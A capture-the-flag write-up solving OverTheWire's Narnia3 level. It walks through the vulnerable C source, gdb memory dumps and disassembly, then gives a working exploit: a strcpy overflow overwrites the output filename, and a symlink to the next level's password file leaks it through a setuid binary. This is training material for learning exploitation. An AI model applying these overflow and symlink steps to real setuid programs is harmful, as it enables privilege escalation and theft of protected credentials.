#Narnia3

narnia.labs.overthewire.org

**Username:** narnia3
**Password:** see [narnia2](https://github.com/Alpackers/CTF-Writeups/tree/master/Misc/OverTheWire/Narnia/Naria2)
**Description:**  
> This wargame is for the ones that want to learn basic exploitation. You can see the most common bugs in this game and we've tried to make them easy to exploit. You'll get the source code of each level to make it easier for you to spot the vuln and abuse it.  

##Write-up

> As always, let's go ahead and run the program and see what it does.
>
>```
# ./narnia3
usage, ./narnia3 file, will send contents of file 2 /dev/null
# cat file.txt 
Hello World
# ./narnia3 file.txt
copied contents of file.txt to a safer place... (/dev/null)
>```
>
> Interesting. So it looks like it's just taking whatever is in the file we pass and dumping it into the abyss.
>
> Let's look at the source code.
>
>```C
/*
    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.
>
    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
>
    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h> 
>
int main(int argc, char **argv){
> 
        int  ifd,  ofd;
        char ofile[16] = "/dev/null";
        char ifile[32];
        char buf[32];
> 
        if(argc != 2){
                printf("usage, %s file, will send contents of file 2 /dev/null\n",argv[0]);
                exit(-1);
        }
> 
        /* open files */
        strcpy(ifile, argv[1]);
        if((ofd = open(ofile,O_RDWR)) < 0 ){
                printf("error opening %s\n", ofile);
                exit(-1);
        }
        if((ifd = open(ifile, O_RDONLY)) < 0 ){
                printf("error opening %s\n", ifile);
                exit(-1);
        }
> 
        /* copy from file1 to file2 */
        read(ifd, buf, sizeof(buf)-1);
        write(ofd,buf, sizeof(buf)-1);
        printf("copied contents of %s to a safer place... (%s)\n",ifile,ofile);
 >
        /* close 'em */
        close(ifd);
        close(ofd);
> 
        exit(1);
}
>```
>
> Nothing crazy here.  There are a few characters arrays created with one in particular standing out.  We can see that ```char ifile[32];``` was initialized with a length of 32, but when used later in ```strcpy(ifile, argv[1]);``` is passed a value that could be any length. Let's go ahead and go straight to gdb and try some long strings.
>
> Crickets...getting nothing.  Can't break it by passing just a long string.  Let's look at the dissassembly and pick out a good spot for a breakpoint.
>
>```asm
             main:
0804851d         push       ebp                                                 ; XREF=_start+23
0804851e         mov        ebp, esp
08048520         and        esp, 0xfffffff0
08048523         sub        esp, 0x70
08048526         mov        dword [ss:esp+0x58], 0x7665642f
0804852e         mov        dword [ss:esp+0x5c], 0x6c756e2f
08048536         mov        dword [ss:esp+0x60], 0x6c
0804853e         mov        dword [ss:esp+0x64], 0x0
08048546         cmp        dword [ss:ebp+arg_0], 0x2
0804854a         je         0x804856d
>
0804854c         mov        eax, dword [ss:ebp+arg_4]
0804854f         mov        eax, dword [ds:eax]
08048551         mov        dword [ss:esp+0x4], eax
08048555         mov        dword [ss:esp], 0x8048710                           ; "usage, %s file, will send contents of file 2 /dev/null\\n", argument "format" for method j_printf
0804855c         call       j_printf
08048561         mov        dword [ss:esp], 0xffffffff                          ; argument "status" for method j_exit
08048568         call       j_exit
>
0804856d         mov        eax, dword [ss:ebp+arg_4]                           ; XREF=main+45
08048570         add        eax, 0x4
08048573         mov        eax, dword [ds:eax]
08048575         mov        dword [ss:esp+0x4], eax                             ; argument "src" for method j_strcpy
08048579         lea        eax, dword [ss:esp+0x38]
0804857d         mov        dword [ss:esp], eax                                 ; argument "dst" for method j_strcpy
08048580         call       j_strcpy
08048585         mov        dword [ss:esp+0x4], 0x2                             ; argument "oflag" for method j_open
0804858d         lea        eax, dword [ss:esp+0x58]
08048591         mov        dword [ss:esp], eax                                 ; argument "path" for method j_open
08048594         call       j_open
08048599         mov        dword [ss:esp+0x6c], eax
0804859d         cmp        dword [ss:esp+0x6c], 0x0
080485a2         jns        0x80485c4
>```
>
> ```j_strcpy``` looks like a good candidate. Let's set our breakpoint for just after and see what's there.
>
>```asm
(gdb) break *0x08048585
Breakpoint 1 at 0x8048585
(gdb) run $(python -c 'print "A"*32')
Starting program: /root/narnia3 $(python -c 'print "A"*32')
warning: no loadable sections found in added symbol-file system-supplied DSO at 0xf7fde000
>
Breakpoint 1, 0x08048585 in main ()
(gdb) x/100x $esp
0xffffd450:	0xffffd488	0xffffd6d1	0x00000000	0x00000001
0xffffd460:	0xf7ffd908	0xffffd496	0xffffd4a0	0xf7ed8960
0xffffd470:	0xffffd496	0xf7e86315	0xffffd497	0x00000001
0xffffd480:	0x00000000	0xffffd520	0x41414141	0x41414141
0xffffd490:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd4a0:	0x41414141	0x41414141	0x76656400	0x6c756e2f
0xffffd4b0:	0x0000006c	0x00000000	0x0804868b	0xf7fb6ff4
0xffffd4c0:	0x08048680	0x00000000	0xffffd548	0xf7e6de46
0xffffd4d0:	0x00000002	0xffffd574	0xffffd580	0xf7fdb860
0xffffd4e0:	0xf7ff4821	0xffffffff	0xf7ffcff4	0x08048299
0xffffd4f0:	0x00000001	0xffffd530	0xf7fedc16	0xf7ffdac0
0xffffd500:	0xf7fdbb58	0xf7fb6ff4	0x00000000	0x00000000
0xffffd510:	0xffffd548	0xe26b5374	0xd07ee564	0x00000000
0xffffd520:	0x00000000	0x00000000	0x00000002	0x08048420
0xffffd530:	0x00000000	0xf7ff39c0	0xf7e6dd6b	0xf7ffcff4
0xffffd540:	0x00000002	0x08048420	0x00000000	0x08048441
0xffffd550:	0x0804851d	0x00000002	0xffffd574	0x08048680
0xffffd560:	0x080486f0	0xf7fee590	0xffffd56c	0xf7ffd908
0xffffd570:	0x00000002	0xffffd6c3	0xffffd6d1	0x00000000
0xffffd580:	0xffffd6f2	0xffffd705	0xffffd738	0xffffd743
0xffffd590:	0xffffd753	0xffffd7a4	0xffffd7b6	0xffffd7e8
0xffffd5a0:	0xffffd809	0xffffd813	0xffffdd34	0xffffdd62
0xffffd5b0:	0xffffddb0	0xffffddbe	0xffffddc9	0xffffdde1
0xffffd5c0:	0xffffde23	0xffffde32	0xffffde3c	0xffffde4d
0xffffd5d0:	0xffffde64	0xffffde79	0xffffde82	0xffffde95
>```
>
> It looks like there is something right after the ```A```.  Let's try to look at this another way and see if that's our output file.
>
>```asm
(gdb) define xxd
Type commands for definition of "xxd".
End with a line saying just "end".
dump binary memory dump.bin $arg0 $arg0+$arg1
shell xxd dump.bin
end
(gdb) xxd $esp 125
0000000: 88d4 ffff d1d6 ffff 0000 0000 0100 0000  ................
0000010: 08d9 fff7 96d4 ffff a0d4 ffff 6089 edf7  ............`...
0000020: 96d4 ffff 1563 e8f7 97d4 ffff 0100 0000  .....c..........
0000030: 0000 0000 20d5 ffff 4141 4141 4141 4141  .... ...AAAAAAAA
0000040: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
0000050: 4141 4141 4141 4141 0064 6576 2f6e 756c  AAAAAAAA.dev/nul
0000060: 6c00 0000 0000 0000 8b86 0408 f46f fbf7  l............o..
0000070: 8086 0408 0000 0000 48d5 ffff 46         ........H...F
>```
>
> Ok, we can see our null character ending our string and then ```dev/null``` right after.  Let's see if we can overwrite that.
>
>```asm
(gdb) run $(python -c 'print "A"*40')
Starting program: /root/narnia3 $(python -c 'print "A"*40')
warning: no loadable sections found in added symbol-file system-supplied DSO at 0xf7fde000
>
Breakpoint 1, 0x08048585 in main ()
(gdb) xxd $esp 125
0000000: 78d4 ffff c9d6 ffff 0000 0000 0100 0000  x...............
0000010: 08d9 fff7 86d4 ffff 90d4 ffff 6089 edf7  ............`...
0000020: 86d4 ffff 1563 e8f7 87d4 ffff 0100 0000  .....c..........
0000030: 0000 0000 10d5 ffff 4141 4141 4141 4141  ........AAAAAAAA
0000040: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
0000050: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
0000060: 0000 0000 0000 0000 8b86 0408 f46f fbf7  .............o..
0000070: 8086 0408 0000 0000 38d5 ffff 46         ........8...F
>```
>
> There we go.  So it looks like we can redirect the output file to something of our choosing.  The target is going to be reading the ```/etc/narnia_pass/narnia4``` file.  Now we just need to come up with a way to create a payload around those two pieces of information.
>
> After some messing around I think I found the right track.  The input file is going to be a long name because we have to overwrite the output file at the end. At the same time, that input has to exist and we ultimately want that file to be the password file.  What if we create a symbolic link with the big long name and point it to ```/etc/narnia_pass/narnia4```.  If we can do that, then we just need to give it any other output file besides ```/dev/null``` and we should be able to retrieve the password. Let's go ahead and login and give it a try.
>
>```
narnia3@melinda:/narnia$ ln -s /etc/narnia_pass/narnia4 $(python -c 'print "A"*32+"\x66\x69\x6c\x65"')
ln: failed to create symbolic link 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAfile': Permission denied
narnia3@melinda:/narnia$ ls -la .
total 77
drwxr-xr-x  2 root    root    1024 Nov 14  2014 .
drwxr-xr-x 11 root    root    1024 Mar 18 12:34 ..
-r-sr-x---  1 narnia1 narnia0 7452 Nov 14  2014 narnia0
-r--r-----  1 narnia0 narnia0 1138 Nov 14  2014 narnia0.c
-r-sr-x---  1 narnia2 narnia1 7368 Nov 14  2014 narnia1
-r--r-----  1 narnia1 narnia1 1000 Nov 14  2014 narnia1.c
-r-sr-x---  1 narnia3 narnia2 5142 Nov 14  2014 narnia2
-r--r-----  1 narnia2 narnia2  999 Nov 14  2014 narnia2.c
-r-sr-x---  1 narnia4 narnia3 5816 Nov 14  2014 narnia3
-r--r-----  1 narnia3 narnia3 1841 Nov 14  2014 narnia3.c
-r-sr-x---  1 narnia5 narnia4 5320 Nov 14  2014 narnia4
-r--r-----  1 narnia4 narnia4 1064 Nov 14  2014 narnia4.c
-r-sr-x---  1 narnia6 narnia5 5488 Nov 14  2014 narnia5
-r--r-----  1 narnia5 narnia5 1221 Nov 14  2014 narnia5.c
-r-sr-x---  1 narnia7 narnia6 5869 Nov 14  2014 narnia6
-r--r-----  1 narnia6 narnia6 1566 Nov 14  2014 narnia6.c
-r-sr-x---  1 narnia8 narnia7 6463 Nov 14  2014 narnia7
-r--r-----  1 narnia7 narnia7 1930 Nov 14  2014 narnia7.c
-r-sr-x---  1 narnia9 narnia8 5213 Nov 14  2014 narnia8
-r--r-----  1 narnia8 narnia8 1292 Nov 14  2014 narnia8.c
>```
>
> Hmmm, permission denied.  Let's find a directory that we can create a symbolic link in.
>
>```
narnia3@melinda:/tmp$ find / -type d -user narnia3 -print 2>/dev/null
/proc/1811
/proc/1811/task
/proc/1811/task/1811
/proc/1811/task/1811/fd
/proc/1811/task/1811/fdinfo
/proc/1811/task/1811/ns
/proc/1811/task/1811/net
/proc/1811/task/1811/attr
/proc/1811/fd
/proc/1811/fdinfo
/proc/1811/ns
/proc/1811/net
/proc/1811/attr
/proc/32190
/proc/32190/task
/proc/32190/task/32190
/proc/32190/task/32190/fd
/proc/32190/task/32190/fdinfo
/proc/32190/task/32190/ns
/proc/32190/task/32190/net
/proc/32190/task/32190/attr
/proc/32190/fd
/proc/32190/fdinfo
/proc/32190/ns
/proc/32190/net
/proc/32190/attr
/run/user/14003
/sys/fs/cgroup/systemd/user/14003.user/39597.session
>```
>
> Ok, ```/run/user/14003``` will work as good as any.
>
>```
narnia3@melinda:/tmp$ cd /run/user/14003
narnia3@melinda:/run/user/14003$ ln -s /etc/narnia_pass/narnia4 $(python -c 'print "/run/user/14003/"+"A"*16+"/run/user/14003/f"')
ln: failed to create symbolic link '/run/user/14003/AAAAAAAAAAAAAAAA/run/user/14003/f': No such file or directory
>```
>
> Man, things are going to get weird fast.  It looks like I need to create this weird directory structure first.  Let's do that and try again.
>
>```
narnia3@melinda:/run/user/14003$ mkdir -p $(python -c 'print "A"*16')/run/user/14003
narnia3@melinda:/run/user/14003$ ln -s /etc/narnia_pass/narnia4 $(python -c 'print "/run/user/14003/"+"A"*16+"/run/user/14003/f"')
narnia3@melinda:/run/user/14003$ ls -l AAAAAAAAAAAAAAAA/run/user/14003/
total 0
lrwxrwxrwx 1 narnia3 narnia3 24 Jul 20 04:40 f -> /etc/narnia_pass/narnia4
>```
>
> Symbolic link set.  Now we need to create the actual output file as listed after the ```A``` section of our payload.
>
>```
narnia3@melinda:/run/user/14003$ touch f
narnia3@melinda:/run/user/14003$ chmod 666 f
narnia3@melinda:/run/user/14003$ ls -l
total 0
drwxrwxr-x 3 narnia3 narnia3 60 Jul 20 04:38 AAAAAAAAAAAAAAAA
-rw-rw-rw- 1 narnia3 narnia3  0 Jul 20 04:45 f
>```
>
> Now we should be setup to run. Let's cross our fingers and pull the trigger.
>
>```
narnia3@melinda:/narnia$ ./narnia3 $(python -c 'print "/run/user/14003/"+"A"*16+"/run/user/14003/f"')
error opening /run/user/14003/f
>```
>
> Now what! After checking, re-checking, and double-checking I found the culprit.  It turned out the be a permissions issue in the path.
>
>```
narnia3@melinda:/run$ ls -la
total 196
drwxr-xr-x 18 root       root          660 Jul 20 04:49 .
narnia3@melinda:/run$ cd /run/user/
narnia3@melinda:/run/user$ ls -la
total 0
drwxr-xr-x 42 root       root       840 Jul 20 04:49 .
narnia3@melinda:/run/user$ cd 14003
narnia3@melinda:/run/user/14003$ ls -la
total 0
drwx------  3 narnia3 narnia3  80 Jul 20 04:45 .
narnia3@melinda:/run/user/14003$ cd ..
narnia3@melinda:/run/user$ chmod 777 14003
narnia3@melinda:/run/user$ cd 14003/
narnia3@melinda:/run/user/14003$ ls -la
total 0
drwxrwxrwx  3 narnia3 narnia3  80 Jul 20 04:45 .
drwxr-xr-x 41 root    root    820 Jul 20 04:54 ..
drwxrwxr-x  3 narnia3 narnia3  60 Jul 20 04:38 AAAAAAAAAAAAAAAA
-rw-rw-rw-  1 narnia3 narnia3   0 Jul 20 04:45 f
narnia3@melinda:/run/user/14003$ cd /narnia
narnia3@melinda:/narnia$ ./narnia3 $(python -c 'print "/run/user/14003/"+"A"*16+"/run/user/14003/f"')
copied contents of /run/user/14003/AAAAAAAAAAAAAAAA/run/user/14003/ to a safer place... (/run/user/14003/)
narnia3@melinda:/narnia$ cat /run/user/14003/f
**********
���������S_��narnia3@melinda:/narnia$
>```
>
> Wow. Just wow. That was such a weird little challenge. Off to narnia4 we go.
